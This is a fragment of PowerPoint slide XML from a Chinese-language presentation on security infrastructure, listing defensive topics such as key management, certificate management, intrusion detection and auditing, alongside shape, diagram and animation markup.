              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>密钥管理功能</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>检测和响应功能</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="2996952"/>
            <a:ext cx="4572000" cy="2899255"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>方法：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>密钥管理</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>优先权管理</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>证书管理</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>入侵检测、</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>审计、配置</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息调查、收集</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3901814" y="2661873"/>
            <a:ext cx="4823086" cy="3539018"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23590745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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="972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728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7283">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9728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728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7283">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9728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728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7283">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9728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72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p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">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build="p"/>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3288" y="4365104"/>
            <a:ext cx="6370712" cy="1943100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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1196752"/>
            <a:ext cx="7048500" cy="3261848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="692696"/>
            <a:ext cx="4940776" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>支撑性基础设施建设</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>——</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>示例</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23000193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6" name="Group 3"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="325276" y="1268760"/>
            <a:ext cx="8569647" cy="5112568"/>
            <a:chOff x="187" y="119"/>
            <a:chExt cx="5460" cy="4219"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="98310" name="Group 4"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="2507" y="2275"/>
              <a:ext cx="635" cy="318"/>
              <a:chOff x="2317" y="1111"/>
              <a:chExt cx="755" cy="445"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98510" name="Rectangle 5"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2317" y="1111"/>
                <a:ext cx="755" cy="445"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="00CC99"/>
              </a:solidFill>
              <a:ln w="38100">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:miter lim="800000"/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr wrap="none" tIns="9144" rIns="27432"/>
              <a:lstStyle/>
              <a:p>
                <a:pPr algn="r" eaLnBrk="0" hangingPunct="0"/>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1200" b="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>远程用户</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98511" name="Freeform 6"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2372" y="1437"/>
                <a:ext cx="363" cy="114"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 1597 h 95"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 13046 h 95"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2239 h 95"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 446 h 95"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 95"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 1597 h 95"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 287"/>
                  <a:gd name="T19" fmla="*/ 0 h 95"/>
                  <a:gd name="T20" fmla="*/ 287 w 287"/>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287" h="95">
                    <a:moveTo>
                      <a:pt x="287" y="12"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="95"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="12"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98512" name="Freeform 7"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1233"/>
                <a:ext cx="230" cy="207"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 468 h 172"/>
                  <a:gd name="T2" fmla="*/ 17619 w 182"/>
                  <a:gd name="T3" fmla="*/ 25518 h 172"/>
                  <a:gd name="T4" fmla="*/ 12976 w 182"/>
                  <a:gd name="T5" fmla="*/ 24724 h 172"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5582 h 172"/>
                  <a:gd name="T8" fmla="*/ 94937 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 172"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 468 h 172"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 w 182"/>
                  <a:gd name="T19" fmla="*/ 0 h 172"/>
                  <a:gd name="T20" fmla="*/ 182 w 182"/>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182" h="172">
                    <a:moveTo>
                      <a:pt x="182" y="3"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="32" y="172"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="171" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="3"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98513" name="Freeform 8"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2371" y="1435"/>
                <a:ext cx="363" cy="116"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163251 w 287"/>
                  <a:gd name="T1" fmla="*/ 2167 h 96"/>
                  <a:gd name="T2" fmla="*/ 31914 w 287"/>
                  <a:gd name="T3" fmla="*/ 15792 h 96"/>
                  <a:gd name="T4" fmla="*/ 0 w 287"/>
                  <a:gd name="T5" fmla="*/ 2618 h 96"/>
                  <a:gd name="T6" fmla="*/ 0 w 287"/>
                  <a:gd name="T7" fmla="*/ 684 h 96"/>
                  <a:gd name="T8" fmla="*/ 163251 w 287"/>
                  <a:gd name="T9" fmla="*/ 0 h 96"/>
                  <a:gd name="T10" fmla="*/ 163251 w 287"/>
                  <a:gd name="T11" fmla="*/ 2167 h 96"/>
                  <a:gd name="T12" fmla="*/ 163251 w 287"/>
                  <a:gd name="T13" fmla="*/ 2167 h 96"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 287"/>
                  <a:gd name="T22" fmla="*/ 0 h 96"/>
                  <a:gd name="T23" fmla="*/ 287 w 287"/>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7" h="96">
                    <a:moveTo>
                      <a:pt x="287" y="13"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="56" y="96"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="287" y="13"/>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514" name="Freeform 9"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2332" y="1232"/>
                <a:ext cx="230" cy="208"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 101396 w 182"/>
                  <a:gd name="T1" fmla="*/ 549 h 173"/>
                  <a:gd name="T2" fmla="*/ 17111 w 182"/>
                  <a:gd name="T3" fmla="*/ 25059 h 173"/>
                  <a:gd name="T4" fmla="*/ 12334 w 182"/>
                  <a:gd name="T5" fmla="*/ 23995 h 173"/>
                  <a:gd name="T6" fmla="*/ 0 w 182"/>
                  <a:gd name="T7" fmla="*/ 5465 h 173"/>
                  <a:gd name="T8" fmla="*/ 94840 w 182"/>
                  <a:gd name="T9" fmla="*/ 0 h 173"/>
                  <a:gd name="T10" fmla="*/ 101396 w 182"/>
                  <a:gd name="T11" fmla="*/ 549 h 173"/>
                  <a:gd name="T12" fmla="*/ 101396 w 182"/>
                  <a:gd name="T13" fmla="*/ 549 h 173"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T21" fmla="*/ 0 w 182"/>
                  <a:gd name="T22" fmla="*/ 0 h 173"/>
                  <a:gd name="T23" fmla="*/ 182 w 182"/>
                  <a:gd name="T24" fmla="*/ 173 h 1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73">
                    <a:moveTo>
                      <a:pt x="182" y="4"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="31" y="173"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="166"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="170" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="4"/>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515" name="Freeform 10"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2343" y="1237"/>
                <a:ext cx="242" cy="203"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 114015 w 191"/>
                  <a:gd name="T1" fmla="*/ 16844 h 169"/>
                  <a:gd name="T2" fmla="*/ 13859 w 191"/>
                  <a:gd name="T3" fmla="*/ 23863 h 169"/>
                  <a:gd name="T4" fmla="*/ 0 w 191"/>
                  <a:gd name="T5" fmla="*/ 5384 h 169"/>
                  <a:gd name="T6" fmla="*/ 103024 w 191"/>
                  <a:gd name="T7" fmla="*/ 0 h 169"/>
                  <a:gd name="T8" fmla="*/ 114015 w 191"/>
                  <a:gd name="T9" fmla="*/ 16844 h 169"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 191"/>
                  <a:gd name="T16" fmla="*/ 0 h 169"/>
                  <a:gd name="T17" fmla="*/ 191 w 191"/>
                  <a:gd name="T18" fmla="*/ 169 h 169"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="191" h="169">
                    <a:moveTo>
                      <a:pt x="191" y="119"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="23" y="169"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="173" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="191" y="119"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98516" name="Freeform 11"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="2360" y="1251"/>
                <a:ext cx="208" cy="175"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 85546 w 165"/>
                  <a:gd name="T1" fmla="*/ 16357 h 145"/>
                  <a:gd name="T2" fmla="*/ 10273 w 165"/>
                  <a:gd name="T3" fmla="*/ 23288 h 145"/>
                  <a:gd name="T4" fmla="*/ 0 w 165"/>
                  <a:gd name="T5" fmla="*/ 5404 h 145"/>
                  <a:gd name="T6" fmla="*/ 77887 w 165"/>
                  <a:gd name="T7" fmla="*/ 0 h 145"/>
                  <a:gd name="T8" fmla="*/ 85546 w 165"/>
                  <a:gd name="T9" fmla="*/ 16357 h 145"/>
                  <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                  <a:gd name="T15" fmla="*/ 0 w 165"/>
                  <a:gd name="T16" fmla="*/ 0 h 145"/>
                  <a:gd name="T17" fmla="*/ 165 w 165"/>
                  <a:gd name="T18" fmla="*/ 145 h 145"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="T10">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="T11">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="T12">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="T13">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="T14">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="T15" t="T16" r="T17" b="T18"/>
                <a:pathLst>
                  <a:path w="165" h="145">
                    <a:moveTo>
                      <a:pt x="165" y="102"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="20" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="102"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ln w="9525">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
